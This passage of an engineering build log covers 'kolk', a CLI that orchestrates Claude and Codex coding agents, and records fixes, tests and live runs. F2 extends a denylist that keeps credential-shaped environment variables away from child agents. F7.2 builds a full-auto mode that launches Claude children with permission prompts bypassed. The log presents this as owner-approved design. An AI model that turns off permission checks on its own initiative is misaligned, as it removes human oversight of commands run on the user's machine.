3.3 ms), site 162, surface 15, installer 72, spec 29, release 24/41/30, smoke 18, plan 101,
workflow pins 43. `go test -race -count=1` over `secret`, `provider`, `cli`, `engine` passed;
`gofmt -l`, `go vet`, and `git diff --check` clean. No credential, provider turn, commit, push, tag,
release, scheduler action, or remote state changed. V34.1a is closed; V34.1b is next.

#### F1 — the inline SAGA advances, keeps its goal, and resets — complete 2026-09-02

Program leaf from `FABLE_OPTIMIZATION.md`; feeds V34.3a/b/f. **Risk:** P1 — the inline saga did one
chapter and then reported the rest finished. **Invariant:** every planned chapter being done is the
moment the planner is asked, not the end; a wake never rewrites the goal; a terminal artifact is
reset only by archiving it; the wake enforces the artifact's own limits; cancellation never hides a
commit or rollback error.

Red, from the 2026-09-02 review transcript: wake 1 `build it /saga` planned and finished chapter 1;
wake 2 `continue /saga` printed "has nothing left to work; every chapter is finished or blocked"
and returned without a model call (`cmd_saga_run.go` guard). `saveSagaGoal` set `Goal = "continue"`
on the way (`cmd_saga.go:116`). A completed `SAGA.md` answered every later `/saga` with
"every acceptance criterion is met" and there was no reset path. A wake `SagaBudget` without
`DoomThreshold` blocked at 3 strikes over a `Strikes: 3 / 5` artifact. `Verify` returned bare
`context.Canceled` over a failed `git commit`.

Green, smallest change per defect:

- `runSagaLoop` no longer guards on chapter state; `hasPendingChapter` deleted. The executor's
  `terminalSagaStop` remains the only terminal judgement.
- `openSaga(text)` replaces `saveSagaGoal`: absent artifact → new saga; in flight → goal kept, text
  is a note (unless it restates the goal); finished → `archiveSaga` renames it to
  `SAGA.<started>.md` (`-2`, `-3` … on collision) and a new saga starts. `runInlineSaga` prints the
  one-line notice. `AgentPlanner.Note` / `AgentWorker.Note` put the note in both prompts.
- `sagaWakeBudget(state)` carries `MaxChapters`, `CostLimit`, `DoomThreshold: MaxStrikes`.
- `ChapterVerifier.Verify` and `VerifyChapter` use `sagaCancellationResult` on every real error
  path; `RunWake` compares `SagaStatusBlocked`.
- Stop messages for goal-complete and doom-loop say the next `/saga` archives and starts anew.

Tests: `TestASecondWakeAsksThePlannerWhenEveryChapterIsDone` (REPL over a scripted provider: one
request, the planner; note and goal both in the prompt; `Status: completed` persisted),
`TestAWakeNoteDoesNotReplaceTheGoal`, `TestANewGoalAfterAFinishedSagaArchivesAndStartsFresh`
(completed and blocked), `TestArchivingTwiceInTheSameSecondKeepsBoth`,
`TestWakeBudgetCarriesMaxStrikesFromSagaFile`, `TestACancelledCommitKeepsTheGitError` (verifier and
lifecycle; chapter left `executing`, no strike).

Adversarial: one mutation per fix — guard reinserted, goal overwritten, terminal artifact reused,
threshold dropped, plain cancellation restored — each made its focused test fail and each file was
restored to its pre-mutation SHA-256. Existing coverage retained for executing-before-work
persistence, cancellation during work and verification, terminal artifacts not reopened, and
persistence failure. `go test -race` on `cli` and `engine` clean. Crash injection between persist
and work is not claimed here; V34.3e owns it.

Walk-back: `docs/plan/10` §3.1 and §4 (wake table, reset rule, doom threshold from the artifact),
`FABLE_OPTIMIZATION.md` F1 ticked. Gates: `go test ./... -count=1` green; `make check` recorded in
the build log. No provider turn, credential, push, tag, release, or remote state changed.

#### F2 — delegated execution says what it does, and does what it says — complete 2026-09-02

Program leaf from `FABLE_OPTIMIZATION.md`; feeds V34.1b and V34.1f. **Risk:** P1 — the network
policy `docs/plan/13` promised was not what shipped, and one vendor could contradict the status line.
**Invariant:** a child's network access is decided once per task, before the briefing, the status
line, and the vendor flag are written, and all three say the same thing; a child that cannot be run
without network is declared to have it or refused, never pretended; no credential-shaped variable
in the parent environment reaches either child path.

Red, from the 2026-09-02 review: `run.go` declared `NetworkAccess: true` for every child; Codex
expressed "disabled" by omitting `sandbox_workspace_write.network_access`, so a user's
`~/.codex/config.toml` could enable it while `subagentCapabilitySummary` said `network=disabled`; the
one-shot path scrubbed `*_API_KEY` while `AWS_SECRET_ACCESS_KEY` and `OPENAI_API_KEY_BACKUP` passed.

Green:

- `engine.SubagentNetwork` policy (`auto` | `on` | `off`, `NormalizeSubagentNetwork`);
  `Agent.subagentNetwork(kind, model)` decides from the policy, `kindWantsNetwork` (research only),
  and `vendorLacksNetworkSwitch` (the ceiling ladder's `claude`). `subagentCapabilities(kind, model)`
  and `openSubagentBackend(…, kind)` take the task; the orchestrator recomputes the envelope when the
  fallback changes model. `run.go` passes `cfg.SubagentNetwork`; the config key `subagent_network` is
  settable, gettable, unsettable, and validated at the point of typing.
- `BuildCodexInvocationWithOptions` states `network_access=%t` on every non-empty envelope; a bare
  invocation still leaves the vendor's config in charge.
- `sensitiveEnvName` gains `_ACCESS_KEY`, `_PAT`, `_PASSPHRASE` and anywhere-in-name `API_KEY`,
  `SECRET`, `PASSWORD`; `TOKEN` stays suffix-only (`TOKENIZERS_PARALLELISM`).

Decision recorded, not a defect: the vendor's own API key stays scrubbed. A claude or codex child
that received it would bill the API instead of the plan the user signed in with; the reviewer's
`OPENAI_API_KEY`-authenticated Codex user is a metered-API user, which is not the subscription
handoff this backend is. `docs/plan/13` §7.1 carries the rule and the allowlist-vs-denylist reasoning.

Tests: `TestSubagentNetworkFollowsPolicyKindAndVendorSwitch` (12 rows over policy × kind × vendor),
`TestBackgroundTaskKindsRunWithoutNetwork` (edit without, research with; summary agrees),
`TestCodexNetworkDisabledIsExplicitNotOmitted` (and the bare invocation carries no override),
`TestChildrenNeverInheritASentinelSecretOnEitherPath` (ten sentinels on both paths, `GOFLAGS` kept),
`TestSubagentNetworkPolicyRoundTripsAndRejectsUnknown`. The existing declared-envelope test now proves
policy `on` reaches the factory.

Adversarial: three mutations — network always on, Codex omitting `false`, denylist without
`_ACCESS_KEY` — each failed its focused test and restored byte-identically. A config-side re-enable
cannot beat an explicit `-c` by the vendor's own precedence. Symlinked additional directories were
already canonicalised. `go test -race` clean on `engine`, `shell`, `agentcli`, `cli`.

Walk-back: `docs/plan/13` §7.1, `docs/plan/34` V34.1b part-done (PTY/login path remains),
`AGENTS.md`, `FABLE_OPTIMIZATION.md` F2. Gates: `go test ./... -count=1` green; `make check` green at
3,202 tests. No provider turn, credential, push, tag, release, or remote state changed.

#### F3 — Fable is a model the harness can select and route below — complete 2026-09-02

Program leaf from `FABLE_OPTIMIZATION.md`; feeds V34.4a/b. **Risk:** P2 — the top Claude rung had no
plan catalog row, so a Max user could not select it through the plan selector; the bottom rung had
none either. **Invariant:** every catalog row is backed by a live vendor check; selection includes the
signed-in tier; a Fable session's roster descends to Haiku for trivial work and never climbs.

Evidence, live on this machine (claude 2.1.258, 2026-09-02): `claude -p hi --model
definitely-not-a-model-xyz --output-format json` → `[claude-code:unrecognized_model]`,
`api_error_status: 404`, `total_cost_usd: 0` (the zero-cost fire-and-check path). `--model haiku
--effort low` and `--model fable --effort max`, each `-p "Reply with exactly: ok" --max-turns 1` →
`stop_reason: end_turn` (plan-equivalent cost $0.017 and $0.156). `claude --help` lists `--effort
(low, medium, high, xhigh, max)` and the `fable` alias verbatim.

Green: `claude-haiku` (Claude Pro, `low,medium,high`) and `claude-fable` (Claude Max,
`low,medium,high,max`) rows in `planModelCatalog`, evidence in the source comment;
`engine.ModelsBelowCeiling`; `reportAgentLane` at the top rung with nothing signed in names what a
sign-in would unlock. Tests: `TestPlanCatalogListsFableAndHaikuWithVerifiedEfforts`,
`TestFableNeedsMaxAndHaikuIsOnEveryClaudePlan` (Max reaches all four; Pro reaches haiku/sonnet and is
told the Max sign-in for fable), `TestMaxEffortReachesClaudeAsMaxOnFable`,
`TestAFableSessionRoutesTrivialWorkToHaikuOnThePlan`, `TestTopRungLaneSaysWhatASignInWouldUnlock`.

Correction recorded: the leaf as planned expected to build plan-native downward routing on the
strength of build-log FR4.3 ("not built"). STIGI C6–C8 had built it two days later (`roster.go`,
`level_routing.go`, `rungAvailable`); on that path `bindLevel` always binds and the gateway slot
path is unreachable for a plan session. F3.3 is verification. The stale-premise guard
`TestOpeningACheaperRungDoesNotGoThroughThePlanCatalogue` — which asserted the catalogue did *not*
know haiku — was rewritten to prove every ladder rung opens through the connector manifest, never
nil-and-nil, which is the property that mattered.

Adversarial: three mutations — fable row commented out, `ModelsBelowCeiling` returning nothing, the
lane hint disabled — each failed its focused test and restored byte-identically. `go test -race`
clean on `engine`, `provider`, `cli`.

Not done, by decision: `StandardModelAliases` still maps bare `haiku`/`opus`/`sonnet` to Claude 3-era
gateway ids and `claude-max` to `claude-opus`; changing a shorthand's meaning moves users' models
silently and is V34.4c's, with an owner decision. Walk-back: `docs/plan/24` Anthropic row,
`FABLE_OPTIMIZATION.md` F3. Gates: `go test ./... -count=1` green; `make check` in the build log. Two
one-turn provider calls were made on the owner's own login for the fire-and-check above; no
credential, push, tag, release, or remote state changed.

#### F4 — discover, don't burn — complete 2026-09-02

Owner decision (verbatim in `FABLE_OPTIMIZATION.md` §F4): map every vendor's models on every start
and every login, never burn names, show only mapped rows with their info. **Risk:** P1 product truth
— a model command that names what the vendor no longer offers. **Invariant:** every connector kolk
can sign into answers with a lister; a lister answers with rows or with a reason, never nil and
never an empty success; a row's status says how kolk knows.

Red: `codexRungs` and `planModelCatalog` carry `gpt-5.6-pro`; `codex debug models` (0.149.1,
2026-09-02) does not list it, lists `gpt-5.5`/`gpt-5.2` kolk does not know, and Sol/Terra accept
`ultra`, which `codexEfforts` refuses. Claude Code has no listing command; `--max-turns 0` still
spends a turn; an invalid name fails locally for free; the gateway catalog carries the exact ids.

Green, F4.1: `provider.ModelLister` port, `VendorCatalog`/`DiscoveredModel`, statuses `listed`,
`verified`, `unverified`, `gone`, `NotListable`, `GatewayPreviewLister` (exact ids by provider
prefix, variants dropped, `unverified`). Registry `cli.modelListerFor` with
`TestEveryConnectorCanListItsModels` over `provider.Plans("")`: codex → catalog; claude, gemini,
xai-api, perplexity-api, mistral-api, deepseek-api, qwen-api, cohere-api → gateway preview; ollama →
ollama.com `/api/tags`; copilot → `NotListable` with the reason. `agentcli.ClaudeEfforts()` exported
for the preview (the one thing a Claude row carries from kolk, stated as such).

Green, F4.2: `agentcli.CodexLister` (`--version`, then `debug models`, scrubbed child path) and
`ParseCodexModelCatalog`; fixture `internal/provider/agentcli/testdata/codex_debug_models_2026-09-02.json`.
Tests: `TestCodexCatalogIsWhatTheVendorListsNotWhatKolkWroteDown` (eight rows, Sol rank 1 with six
efforts including `ultra`, `gpt-5.4` hidden not missing, `gpt-5.6-pro` absent, visible order by
priority), `TestCodexCatalogToleratesNewFieldsAndRefusesTheWrongShape`,
`TestCodexListerRunsTheVendorAndRecordsItsVersion` (missing binary → reason), env-gated
`TestLiveCodexCatalogAnswers` (ran: 0.149.1, eight models, 50 ms; the refreshed catalog lists
`gpt-5.4`/`gpt-5.4-mini` that the bundled one hides). Also `TestGatewayPreviewListsExactIDsAsUnverified`,
`TestGatewayPreviewFailsLoudlyWithNothingToPreviewFrom`, `TestNotListableIsAnAnswerNotAnOmission`,
`TestVisibleOrdersByRankAndDropsHiddenAndGone`, `TestClaudePreviewCarriesTheVendorEffortSet`,
`TestOllamaListerAsksTheCloudCatalogAndReportsFailure`.

Adversarial: five mutations — hidden rows kept visible, `:batch` variants kept, Codex `hide`
ignored, priority dropped, the codex connector returning nil — each failed its focused test and
restored byte-identically (one reverse pattern was over-broad on the first run and rewrote a second
`return nil`; caught by the cli suite, repaired, the script fixed to anchor on a marker).
`StatusVerified` is allowlisted in `arch.DeadExportAllowlist` with the note that F4.3 wires it and
removes the entry. `go test -race` clean on `provider`, `agentcli`, `cli`. `make check` green at
3,218 tests.

Green, F4.3 (owner correction: preview from the gateway, verify on the first prompt, same for every
vendor without a catalog): `agentcli.ClaudePreviewLister` — one row per family the CLI's aliases
name, strongest first, built from the gateway's `anthropic/claude-*` ids (modern and legacy
spellings), exact ids newest first, largest context, `ClaudeEfforts()`, `unverified`; variants
never match the family pattern; an unknown family is never a row. `provider.VendorCatalogs` in
`vendor-models.json` (`paths.VendorCatalogFile`, atomic, creates the cache directory): `Replace`
carries `verified` forward and keeps dropped rows as `gone`; `Verify` promotes and records the
vendor's resolved id first; `Gone` retires only a listed row. `verifyingBackend.observe` runs on
every turn: success → `Verify(connector, asked, meta.Model)` where `meta.Model` is the stream-json
`init.model`; `agentcli.IsModelRefusal` (the vendor's `unrecognized_model` marker or its "issue with
the selected model … may not exist" prose, nothing looser) → `Gone`; any other failure teaches
nothing. `StatusVerified` left the dead-export allowlist the same day it entered. Tests:
`TestClaudePreviewGroupsTheGatewayByTheCLIsFamilies` (fable/opus/sonnet/haiku from twelve gateway
rows incl. `-fast`, `:batch`, legacy `claude-3-haiku`), `TestClaudePreviewNeedsAGatewayAndAKnownFamily`,
`TestIsModelRefusalMatchesOnlyTheVendorsPhrasing`, `TestVendorCatalogStoreRoundTripsAndStartsEmpty`
(a corrupt file is an error, never a silent restart), `TestATurnPromotesAndARefusalRetires`,
`TestReplaceCarriesVerificationForwardAndRetiresTheDropped`,
`TestTheFirstPromptVerifiesTheModelInTheVendorCatalog` (opus promoted with the resolved id, haiku
untouched, a refusal retires haiku, a network error changes nothing). Four mutations — family
pattern accepting variants, refusal match loosened, `Replace` forgetting `verified`, the turn
teaching nothing — each failed its test and restored byte-identically; a fifth (an explicit
variant skip) did not go red because the pattern already excluded variants, so the redundant skip
was deleted rather than kept as a guard that proves nothing. `make check` green at 3,225 tests.

Green, F4.4: `discoverVendorModels` (enabled connectors only, 15 s per vendor, version change →
`Forget` first, a vendor that will not answer keeps its last catalog and is reported, one save);
hooks on every start (`newAgent`, behind the prompt, with the gateway catalog startup loaded), every
login (`runConnectorLoginWith`, after the connector is recorded, one actionable line), and `kolk
models --refresh`; `provider.CachedCatalog` reads the gateway cache without a client for the login
preview; `app.modelLister` is the test seam so no test runs an installed CLI. Tests:
`TestStartupDiscoversEveryEnabledConnectorInTheBackground` (a recorded-but-disabled gemini is not
asked; codex and claude once each), `TestLoginDiscoversThatConnectorAndSaysWhatItFound` (hidden rows
unnamed; a failing vendor reported with its reason and its last catalog kept),
`TestAVendorVersionChangeForgetsWhatATurnHadVerified` (0.149.1 → 0.150.0 demotes `verified`; the
same version carries it forward), `TestPlanLoginRunsTheVendorMappingBeforeReturning` (through the
real login path with a no-op vendor login). Four mutations — disabled vendors asked, version change
ignored, a failure blanking the catalog, the login hook removed — each failed its test and restored
byte-identically; the first only went red once the fixture recorded a disabled connector, which is
the case the guard exists for. `make check` green at 3,229 tests.

Green, F4.5 (decision: seed ladder = ranking; vendor catalog = availability): `DerivePlanModels`,
`PlanModelsFrom`, `ResolvePlanModelFrom` with `ErrModelGone`; `PlanModel.Status`/`Context`;
`ExecutionOptions.Efforts` and `effortAllowed` (discovered set replaces the seed for validation;
efforts never make an envelope); cli `vendorKnowsModel`/`discoveredEfforts`/`planModels`/
`resolvePlanModel` behind `rungAvailable`, the subagent factory, `planBackendFor` (Codex opened
with the discovered efforts), `pmodels`, the TUI groups, the subscription-first default, and the
agent-lane "out of reach" line (a rung the vendor no longer lists is not named as refused).
`PlanModels`, `ResolvePlanModel`, `CodexEffortValid`, `NewCodexBackendFromHandle` deleted: the
dead-export ratchet flagged all four the moment production stopped calling them. Tests:
`TestDerivedPlanCatalogIsWhatTheVendorsSaid`, `TestResolvePlanModelFromTheVendorCatalog`,
`TestCodexEffortsFollowTheDiscoveredSet`, `TestRungAvailabilityFollowsTheVendorCatalog` (before
discovery the seed answers; after, gpt-5.6-pro is no rung and gpt-5.5 is; a vendor not asked still
answers from its seed; a gone name at the prompt is `ErrModelGone`). Four mutations — seed never
gone, gone still resolves, availability ignoring the catalog, efforts ignoring discovery — each
failed its test and restored byte-identically. `make check` green.

Green, F4.6: `model_rows.go` (`statusNote` — only `unverified` and `gone` are named, because a
status on every line is decoration; `contextWindowLabel`, `ageLabel`, `vendorCatalogFooter`,
`planModelStatusSuffix`, `effortsLabel`); `kolk models` prints one `subscription · <vendor>
<version> — <source>, fetched Nh ago` section per vendor with `id · ctx · efforts · → exact id ·
(note)` rows, kept apart from the gateway rows; `pmodels` gains `STATUS` (the vendor's word) and
`CTX` beside `AUTH` (this machine's word about the connector), plus the footer; the compact
`/model` list appends the note only for the two statuses a person acts on; the TUI picker marks a
previewed row `(unverified)`. A configured model the vendor dropped refuses startup by name through
F4.5's `ErrModelGone`. Tests: `TestStatusNoteNamesOnlyWhatAPersonActsOn`,
`TestContextAndAgeReadTheWayAPersonWouldSayThem`, `TestVendorFooterNamesTheSourceAndTheAge`,
`TestModelsShowsEachVendorsOwnSection` (hidden and gone rows absent, a verified row undecorated,
filtering, and nothing at all before any discovery), `TestPlanModelsCarriesStatusContextAndProvenance`,
`TestBareModelChoicesSayWhatIsUnverifiedAndWhatIsGone`,
`TestAConfiguredModelTheVendorDroppedIsNamedNotSwapped` (through `newAgent`: the refusal names the
model, the vendor and version, and `kolk models`). Five mutations — unverified unmarked, provenance
dropped, hidden/gone shown, pmodels status blanked, the compact note removed — each failed its test
and restored byte-identically; one sed pattern would not apply against an escaped format string and
was re-anchored on a plain line rather than left as a mutation that "passed" by not running.
`make check` green at 3,240 tests.

Green, F4.7 (proof): a fresh clone of `d928b418` passed `make check` (3,240 tests, every gate).
Live end-to-end on this machine with an isolated config and the real installed CLIs: `kolk models
--refresh` ran `codex debug models` (0.149.1) and the gateway preview and wrote `vendor-models.json`
— codex's eight rows (six visible; `gpt-reserve`, `codex-auto-review` kept and hidden), claude's four
family rows with exact ids and 1M/200K contexts; `kolk --model gpt-5.6-pro` was refused with *"the
vendor no longer lists this model: codex 0.149.1 does not list gpt-5.6-pro; `kolk models` shows what
it does"*; `kolk pmodels gpt-5.5` listed a model kolk's source never knew, on both tiers, `listed`,
`272K`, `enabled`. The live catalog lists `gpt-5.4`/`gpt-5.4-mini` where the checked-in bundled
fixture hides them — vendor drift observed within one afternoon of writing the fixture.

The live run found a defect the unit tests had not: `kolk models --refresh` rendered the vendor
sections before running discovery, so a refresh showed the previous catalog and then announced a new
one. Fixed by discovering first. Its test was written twice: the first version called
`discoverVendorModels` and `printVendorModels` directly and its mutation stayed green — a test of
two functions, not of the ordering — so it was rewritten to drive `runModels` over an httptest
gateway, and the mutation then failed as it must. Six mutations across F4.6/F4.7, all red;
`-race` clean on `cli`, `provider`, `agentcli`; `make check` green at 3,241 tests.

**F4 closing statement.** No vendor model name in kolk is true because it is in the source. Every
connector supplies a lister or is `NotListable` with a reason; a vendor with a catalog is asked
(`codex debug models`), a vendor without one is previewed from the gateway's exact ids and verified
by the first prompt's `init.model`; discovery runs on every start, every login, and every
`kolk models --refresh`; the seed ladder keeps only the ranking, while availability, efforts,
context and status come from the vendor; every surface renders that with its provenance. The
owner's case — "tomorrow claude or codex will update his model names and kolk will stop working
correctly" — is now a row that changes status rather than a break.

V34 dispositions recorded (not ticked beyond what is proved): V34.4a part-done — Claude tier
eligibility tested, selection follows the vendor catalog; tier gating for a *discovered* model
remains, since a vendor catalog carries no tier. V34.4b part-done — the Codex catalog is the
vendor's own and live-verified; kolk's four-level dial still cannot reach a vendor `ultra`. No provider turn was spent; one `codex debug models` and one `codex
--version` ran on this machine. No credential, push, tag, release, or remote state changed.

#### F5 — stop repeating work on every turn — complete 2026-09-02

Program leaf from `FABLE_OPTIMIZATION.md`. **Risk:** P3 — no defect, only work paid per turn and per
subagent, which a saga pays hundreds of times. **Rule for the leaf:** measure first, remove only what
the measurement shows, and do not optimize past the budget gate.

Measured before anything changed (`turn_cost_bench_test.go`, 5,000 iterations × 3, this machine).
`strace` is not installed here, so allocations are the reported signal rather than syscall counts;
wall time varied by about 40% run to run on a loaded laptop and is quoted only for scale.

| Per turn | before | after |
|---|---|---|
| Codex argv (workspace + 2 additional dirs) | 54 allocs · 4,945 B · ~45 µs | 6 allocs · 800 B · ~2.4 µs |
| Envelope validation alone | 48 allocs · 4,528 B · ~44 µs | 0 allocs · 0 B · ~28 ns |
| Claude invocation, persistent path | 53 allocs · 5,360 B, built then discarded | not built |
| `SAGA.md` read+parse per wake | 2 | 1 |

Green: `ExecutionOptions.normalized` (unexported, so an envelope from outside the package is always
validated — the marker is trustworthy because nobody outside can set it) short-circuits
`normalizeExecutionOptions`; both provider constructors already stored the normalized value, so the
per-turn re-validation had been recomputing an answer it already had. The Claude one-shot invocation
moved below the persistent path's return, so an ordinary session never builds it. `sagaOpening`
carries the state and path `openSaga` already parsed, and `loadSaga` — whose only purpose was the
second read — is deleted.

One subtlety recorded because it was got wrong first: `executionOptionsEmpty` must ignore both
`normalized` and `Efforts`. Adding `Efforts` to it made an efforts-only envelope look delegated, and
a delegated Codex envelope states the sandbox network flag (F2), so the session's own invocation
began overriding the user's `~/.codex/config.toml`. F2's own test caught it in the same run.

Tests: `TestOptionsAreNormalizedOnceAtConstruction` (behavioural — the workspace is deleted after
construction, so a turn that re-validated would fail, and one that trusts the constructor does not;
plus an envelope literal from outside the package is still validated),
`TestPersistentClaudeTurnBuildsNoInvocation` (same trick at the session boundary),
`TestAWakeParsesTheArtifactOnce`. The `raw` benchmark shapes stay in the suite beside the `perturn`
ones: a first call still pays the old cost, and the two numbers together are what say the change
landed on the loop rather than on the constructor.

Left deliberately, owned by F6.1: `shell.normalizeProcessOptions` still validates the Codex working
directory once per turn — part of the remaining six allocations. Marking it verified across the
package boundary needs either a trapdoor (`shell` exporting a way to claim validation without doing
it) or the shared `shell.VerifiedDir` that F6.1 exists for. A trapdoor for six allocations is a bad
trade.

Gates: `make budgets`, `-race` on `agentcli`, `cli`, `engine`, and `make check`.

**The budget gate caught something else, and it was not F5's.** Cold start measured 31,679 ms
against a 30 ms budget. The cause was the surface closure two commits earlier: `check-budgets.sh`
times startup by running `kolk version` twenty times, `version` had stopped being a verb, and
dispatch turns an unknown word into a prompt — so each run opened a session on this machine's real
Codex subscription and took a turn. `stats.jsonl` records 74 such calls between 16:43 and 16:48
(no dollar cost; a subscription connector, so what was consumed is plan quota). Three earlier
`make check` runs had passed because a *failing* turn is fast, and the budget only notices when the
measurement is slow.

Fixed at the root: `retiredVerbs` maps each removed name to its slash spelling, and dispatch refuses
it for free rather than prompting — `TestARetiredVerbIsRefusedNotSentToAModel` covers all fifteen.
Quoting is unaffected (`kolk "version"` is one argument and never equals a verb), so
`kolk fix the failing test` still works. The budget script now measures `kolk help`, which is in the
closed set and cannot quietly stop existing. Cold start back to 3.6 ms.

#### F6 — one implementation per rule — complete 2026-09-02

Program leaf from `FABLE_OPTIMIZATION.md`. **Risk:** P3 — no defect today; four rules with more than
one implementation, which is where the next one comes from. **Invariant:** no product behaviour
changes.

- **F6.1** `shell.VerifiedDir(label, dir)` is the one implementation of absolute → symlinks resolved
  → exists → is a directory. Three copies called it four checks each with three different wordings.
  The label stays a parameter so an error still names which directory the user got wrong; that is a
  deliberate deviation from the plan's "one error wording".
- **F6.2** Both REPLs collapse to one boundary. The marked-SAGA check now decides only routing — a
  marked request beats slash dispatch — and every ordinary line goes through `runInteractivePrompt`,
  including the plain one that used to call `ag.RunTurn` directly under a copy of the same
  interrupt/error block.
- **F6.3** `SagaRunner.step` is the only path to a chapter, so no caller can reopen a completed or
  blocked saga. Failure *policy* stays with each caller, because a wake stopping and a continuous run
  continuing is a real difference rather than duplication. Extracting it surfaced a distinction the
  two copies had blurred: a planner failure is not a chapter failure, and counting it as one made a
  broken planner loop until the doom threshold. `plannerError` marks it;
  `TestAPlannerThatFailsStopsTheRun` failed the moment the distinction was lost, which is the test
  doing exactly its job. Recorded for the owner: `SagaRunner.Run` has no production caller — SAGA is
  inline, one wake per request — and is kept only because deleting a tested public method is not a
  cleanup's decision. Owner decided 2026-09-03: deleted; its loop tests became repeated wakes.
- **F6.4** The `posture` option and its pass-through are deleted; nothing ever assigned the field, and
  posture is set by `ag.SetPosture` at wake time. `ExecutionOptions.Provider` is kept and now used —
  it keys F6.5's table — which answers R14's "drop it or use it" the other way.
- **F6.5** One subagent port, carrying the envelope. The capability-less form was removed rather than
  shimmed: `openSubagentBackend` silently *preferred* it, so a host that reached for the simpler name
  got a child with no workspace confinement and no network declaration and nothing said so. Every
  child now passes the workspace check. `validateClaudeExecutionOptions` — a free function named for
  one vendor, which is how Codex came to lack the invariant — becomes `providerNetworkSwitch`, a table
  keyed on the envelope's own Provider, and each constructor names its provider so the rule applies
  even when the caller did not.

Consequence recorded rather than smoothed over: every subagent test now declares a workspace, and the
Claude ones declare network, because the single port enforces what the product always enforced in
production. Two tests asserted a status line without the envelope summary — they had been written
against the unconfined port — and now match by prefix.

Verification greps after the change: one `EvalSymlinks` for verified directories, zero
`SubagentBackendWithCapabilities`, zero `validateClaudeExecutionOptions`, zero `posture` option, and
the only remaining `ag.RunTurn` calls are the boundary itself, markdown-command expansion, and the
single-shot path. Gates: `make check`, `-race` on engine, cli, agentcli, shell.

#### F7 — proof and walk-back — complete 2026-09-02

Closing phase of `FABLE_OPTIMIZATION.md`. Each point is run on its own and recorded here as it
lands, so a partial F7 is still a truthful one.

- **F7.1 — fresh-clone gate. Done.** Linux: `git clone` at `2992abf8` into a scratch directory, 0
  untracked or dirty files, `make check` green end to end (spec 29, release 24, release workflow 41,
  release verifier 30, smoke workflow 18, plan 101, workflow pins 43), then
  `go test -race -count=1 ./internal/cli ./internal/engine ./internal/provider ./internal/shell
  ./internal/secret` all `ok`. macOS: CI run `33679111446` on the same commit, `test (macos-latest)`
  job — `gofmt`, `go vet`, `build (CGO_ENABLED=0)`, `test (every module)` all success. Recorded at
  that strength: the macOS job runs neither `-race` nor the static gates, which CI keeps on Ubuntu.
  This run is the first green `ci` on `main` since at least 2026-08-31.
- **F7.2 — live Fable transcript. Done**, owner's go given for the full run. Verbatim pty capture in
  `docs/transcripts/f72-fable-saga-2026-09-02.txt`. Shape: `/plans` → `/pmodels` → `/model` →
  `/mode agent` (lane line) → saga on `claude-fable` in an empty scratch git repo: six chapters over
  six wakes (the planner's granularity, not three), a seventh wake declaring every acceptance
  criterion met and the artifact finished, then a new goal that archived it and planned its own
  chapter 1. Every chapter committed by the saga; `go vet` and `go test` pass in the scratch repo
  afterwards. Vendor catalog moved `claude-fable` from `unverified` to `verified` with exact id
  `claude-fable-5-1` on the first answered turn (F4's promise, seen live).
  **The first attempt died on its first command**, which is what this point exists to find:
  1. *Adapter.* Claude Code 2.1.258 emits `system/permission_denied` with `message` as a plain
     string; `wireFrame.Message` was a struct, so one denied command ended the turn with a Go struct
     dump. Fixed by lazy decoding; anchored by a real 19-frame capture
     (`spec/testdata/foreign/claude-permission-denied.ndjson`, normalised ids); mutation of the guard
     goes red. The reason is not lost: the vendor repeats it in the `tool_result` that follows.
  2. *Permissions.* `docs/plan/04 §4.2` designs kolk's full-auto to reach a Claude child as
     `--permission-mode bypassPermissions`; nothing had built it, so the child always ran
     `acceptEdits` and, with nobody there to approve, every non-trivial Bash command was denied. Built
     through `engine.SubagentCapabilities.Permission` (read from the agent at open time) →
     `agentcli.ExecutionOptions.BypassPermissions` → the mode flag (never
     `--dangerously-skip-permissions`), said once per session on stderr; chat mode ignores it. Tests
     at all three layers; both guards mutate red. The envelope-less Claude constructor went with it.
  3. *Hint.* The first-failure hint printed "if it is not signed in…" for any error; it now prints
     the actual error first.
  4. *Driver.* Piped stdin is single-shot in kolk (run.go reads it whole), so the earlier "stage A"
     sent four slash commands to the model as one prompt. The transcript runs on a pty with
     `TERM=dumb`, one input line per prompt.
  **Found during the run, recorded:**
  5. *Catalog.* `cohere/north-mini-code:free` appeared under the *claude* vendor as `verified` with
     exact id `claude-fable-5-1`. Mechanism established: `ClampToCeiling` passes an unranked id
     through, `backendFor` sends every non-owned prefix to the session backend, the persistent child
     cannot change model after spawn and answers on the one it has, and `VendorCatalogs.Verify`
     creates a row for any asked id. The recorder now refuses a model the vendor does not list and
     says so once (`TestAVendorVerifiesOnlyModelsItLists`, mutation red). A zero-quota experiment
     (slash-only session, no turn) does not recreate the row, so the asker is a turn-time call.
     **Resolved 2026-09-03** with one more Claude Max wake, the note active: it fired during the saga
     *planner's* call, before any chapter — `AgentPlanner` runs on the fast lane, and
     `FastLaneModel` returned the best discovered free gateway model whenever the session model was
     not free, without asking whether the session's backend could run it. On a plan session the
     backend is the vendor child, which runs its own rungs and nothing else. The fast lane on a
     session with a plan connector is now the roster's cheapest signed-in rung, or the session model
     when nothing cheaper is; a Claude model reached through the gateway keeps the free pick, because
     its backend is the gateway (`TestFastLaneOnAVendorSessionIsARungOfThatVendor`, mutation red).
     The connector recorded on the session is the discriminator, not the ladder — the first attempt
     used the ladder and broke two gateway-session tests, correctly.
  6. *Resume.* `-r` restores model and effort (run.go precedence) but the session did not persist
     mode, so `/mode agent` was repeated on every wake. **Built 2026-09-02** at the owner's request:
     `session.Mode` (plan 06 §3 had promised it), written by `Agent.SetMode` so every surface that
     switches records it, recorded at startup, restored with `--mode` flag > session > code.
     `TestModeRoundtrips`, `TestResumeRestoresTheSessionsModeAndTheFlagBeatsIt`,
     `TestSwitchingModeWritesItToTheSession`; both guards red under mutation. The fix also caught
     `newAgent` passing the raw `--mode` flag to the engine instead of the resolved mode.
  Quota: seven agent turns on `claude-fable-5-1` (12,982 tokens by kolk's count) plus the two
  failed attempts and four one-turn diagnostic `claude -p` calls.
- **F7.3 — independent review of F1–F3. Done.** Reviewer: an independent Claude agent
  (general-purpose, fresh context — it had implemented none of F1–F7), in its own git worktree,
  2026-09-02. Brief: restate each phase's invariants from `FABLE_OPTIMIZATION.md`, rerun every named
  test, mutate at least one guard per phase and prove the red and the byte-identical restore, then
  try to break each invariant where the tests do not look.
  *Commands (verbatim from the report):*
  ```
